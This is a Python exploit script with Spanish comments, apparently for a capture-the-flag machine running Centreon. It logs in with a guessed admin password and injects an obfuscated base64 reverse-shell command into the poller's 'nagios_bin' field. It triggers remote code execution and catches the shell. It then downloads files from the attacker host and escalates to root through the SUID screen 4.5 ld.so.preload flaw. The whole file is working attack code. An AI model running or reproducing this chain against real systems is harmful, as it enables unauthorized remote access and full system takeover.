#!/usr/bin/python3
# coding: utf-8

# Este exploit + Privesc necesita de dos archivos relacionandos con SCREEN 4.5 privesc almacenado en la misma carpeta de la maquina

import sys
import time
import requests
import signal
import re
import pdb
import threading

from pwn import *

def def_handler(sig, frame):
        print("\n[+] Saliendo .. .\n")
        sys.exit(1)

# Crtl+C
signal.signal(signal.SIGINT, def_handler)

# Variables Globales, hacemos tres peticiones web 1 main_url, 2 config_url y 3 rce_url
main_url = "http://10.10.10.157/centreon/index.php"
config_url = "http://10.10.10.157/centreon/main.get.php?p=60901"
rce_url = "http://10.10.10.157/centreon/include/configuration/configGenerate/xml/generateFiles.php"
lport = 1234 # No Change THIS

def makeRequest(password):
# Variable "S" para crear una session con la que poder jugar con peticiones Get/Post en la misma Session
        s = requests.session()
# Variable "R" para arrastrar la Variable anterior "S" para arrastrar la session y poder Trabajar con el "Centreon Token" al hacer la peticion a "MAIN__URL"
        r = s.get(main_url)
# Token en el que filtramos con expresiones Regulares para filtrarlo y pasarlo por cada peticion correctamente
        centreon_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[0]
# Data que Formalizamos, modificamos los parametros password y cetreon token para que valgan las variables que tenemos predefinidas
        login_data = {

        'useralias': 'admin',
        'password': password,
        'submitLogin': 'Connect',
        'centreon_token': centreon_token

        }
# Peticion POST arrastrando la session y tramitando la data password1
        r = s.post(main_url, data=login_data)

# Actualizando el valor de la variable cetreon_token a new token, hacemos otra peticion a la url correspondiente y filtramos igual con la libreria RE
        r = s.get(config_url)
# El antiguo cetreon_token ahora lo llamamos new_token y lo reobtenemos de la url correspondiente config_url
        new_token = re.findall(r'type="hidden" value="(.*?)"', r.text)[6]
# Data que Formalizamos en esta nueva peticion web
        data_config_post = {

                'name':'Central',
                'ns_ip_address':'127.0.0.1',
                'localhost[localhost]':'1',
                'is_default[is_default]':'0',
                'ssh_port':'22',
                'init_script':'centengine',
                'nagios_bin':'echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4xMzIvMTIzNCAwPiYxCg==|base64${IFS}-d|bash;',
                'nagiostats_bin':'/usr/sbin/centenginestats',
                'nagios_perfdata':'/var/log/centreon-engine/service-perfdata',
                'centreonbroker_cfg_path':'/etc/centreon-broker',
                'centreonbroker_module_path':'/usr/share/centreon/lib/centreon-broker',
                'centreonbroker_logs_path': '',
                'centreonconnector_path':'/usr/lib64/centreon-connector',
                'init_script_centreontrapd':'centreontrapd',
                'snmp_trapd_path_conf':'/etc/snmp/centreon_traps/',
                'ns_activate[ns_activate]':'1',
                'submitC':'Save',
                'id':'1',
                'o':'c',
                'centreon_token': new_token
                }

        r = s.post(config_url, data=data_config_post)

# Data de la ultima peticion RCE
        rce_data = {

                'poller': '1',
                'debug': 'true',
                'generate':'true'
                }

        r = s.post(rce_url, data=rce_data)


if __name__ == '__main__':

# Metemos un hilo 
        try:
                threading.Thread(target=makeRequest, args=("password1",)).start()
        except Exception as e:
                log.error(str(e))
# Varibles de texto
        p1 = log.progress("Pwn")
        p1.status("Ganando Acceso al sistema")
# variable a la escucha por el puerto indicado 1234 esperando una conexion entrante
        shell = listen(lport, timeout=20).wait_for_connection()
# Bucle if la variable shell no tiene conexion fail
        if shell.sock is None:
                p1.failure("No se ha podido ganar acceso, paquete")
# Cualquier otra cosa Succes
        else:
                p1.success("Yuhu!!, se ha entrablado la conexion ahi to pro")

        time.sleep(2)
# Privesc atraves de el binario SUID SCREEN 4.5
        shell.sendline("cd /tmp")
        shell.sendline("wget http://10.10.16.132/libhax.c")
        shell.sendline("wget http://10.10.16.132/rootshell")
        shell.sendlines("chmod +x libhax.c rottshell")
        shell.sendline("cd /etc")
        shell.sendline("umask 000")
        shell.sendline("screen -D -m -L ld.so.preload echo -ne  '\x0a/tmp/libhax.so'")
        shell.sendline("screen -ls")
        shell.sendline("/tmp/rootshell")
# llamamos a la variable shell final para que nos lance la shell 
        shell.interactive()
